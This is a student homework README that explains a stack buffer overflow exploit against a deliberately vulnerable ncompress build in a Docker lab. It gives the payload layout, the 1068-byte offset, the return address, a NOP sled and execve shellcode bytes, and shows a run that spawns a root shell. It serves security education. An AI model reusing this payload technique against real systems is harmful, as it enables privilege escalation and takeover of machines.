# Homework #0
Full name: **Theodoros Moraitis** (Θεόδωρος Μωραΐτης) <br>
StudentID: **sdi2000150** (1115202000150)

*For the second part of Homework #0 ("Running our first devsecops pipeline") check the `successful_run.txt` file or visit the public repository directly:
https://github.com/sdi2000150/devsecops-pipeline*
## Our first exploit: Control flow hijack with shellcode injection

This readme details how the buffer overflow exploit was crafted and executed against the vulnerable `compress42.c` program (`ncompress` executable). The objective was to overflow the buffer in the `comprexx()` function and hijack the control flow to execute our shellcode, which spawns a root shell.


## Overview

The vulnerable program contains a function `comprexx()` which is being called when `ncompress` is called like this:
```
~$ ncompress arg
```
, where arg is a string (character array) representing the file path for processing. `comprexx()` allocates a local buffer (`tempname`) of size `MAXPATHLEN` (1024 bytes). By overflowing this buffer with a carefully structured payload, I can overwrite the function's return address, redirect execution into a NOP sled, and eventually run our shellcode.

The payload is constructed with the following layout:
- **Junk Data:** Fills the buffer until the return address.
- **Return Address:** Overwrites the original return address to point somewhere into the NOP sled.
- **NOP Sled:** A series of NOP instructions (`\x90`) that provide a sled landing in the shellcode.
- **Shellcode:** Assembly instructions that execute a root shell.


## Payload Construction

My Python script (exploit.py) constructs the payload step-by-step:<br>
*(exploit.py is also full of comments describing these steps)*

1. **Junk Data:**  
    The exploit uses 1072 bytes of data to overflow the buffer until the return address. Through iterative testing (observing segmentation faults and checking with `dmesg`), I determined that 1072 bytes are required. I then use 1068 bytes of junk so that the last 4 bytes exactly overwrite the return address itself.
    ```python
    payload += b"A" * 1068
    ```
2. **Overwriting the Return Address:**
    The next 4 bytes overwrite the return address. I use as address the value SP (Stack Pointer) had at the time of the segfault during the testing with junk data. An offset (here, 12000) is added to the SP value so that the exploit has more possibilities to work in different environments.
    ```python
    payload += struct.pack("<I", 0xffff7fb0 + 12000)
    ```

3. **NOP Sled:**
    A large NOP sled of 24000 bytes (NOPs) is added. This increases the likelihood that the overwritten return address will redirect execution into the NOP sled, eventually sliding into our shellcode.
    ```python
    payload += b"\x90" * 24000
    ```
4. **Shellcode:**
    The shellcode spawns a shell as root and is appended at the end of the payload. This is the same shellcode used at class paradigms.
    ```python
    payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
    ```

## Exploitation Process

1. **Vulnerability Analysis:**
    The source code of ncompress (compress42.c) shows that thecomprexx() function uses a local buffer of fixed size (1024bytes). Overflowing this buffer allows us to overwrite thereturn address on the stack.

2. **Determining the position of the return address:**
    I tested the exploit with increasing junk data until a segmentation fault occurred (starting with 1024 A's and going up). While segfault started to happen, using dmesg, the IP (Instruction Pointer) should be overwritten with 41414141 (the hexadecimal representation of "AAAA"). The moment this happened was at 1072 bytes (A's), so I concluded that at 1068 byte the return address was placed, and this is where I should overwritte it with my own return address.

3. **Crafting the Payload:**
    The payload layout ensures that the overwritten return address points into the large NOP sled, allowing the program execution flow to "slide" into the shellcode. The shellcode then executes, spawning a shell with root privileges.

4. **Launching the Exploit:**
    The payload is saved (for example, in a file named payload). The exploit is launched by giving the payload as an argument into the `ncompress` program.

A successful invocation follows (where `...` there were many A's and �'s respectively):

```
teomor@teomor-ThinkPad-Ubuntu:~$ docker run --rm --privileged -v `pwd`/exploit.py:/exploit.py -it ethan42/ncompress:vulnerable 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

ubuntu@7461aee61d58:~$ echo hello | ncompress
��hʰa�Fubuntu@7461aee61d58:~$ python3 /exploit.py > payload
ubuntu@7461aee61d58:~$ whoami
ubuntu
ubuntu@7461aee61d58:~$ ncompress `cat payload`
AAAA...AAAA����...����1�Ph//shh/bin����°
                                                                                      ̀1�@̀: File name too long
# whoami
root
# 
```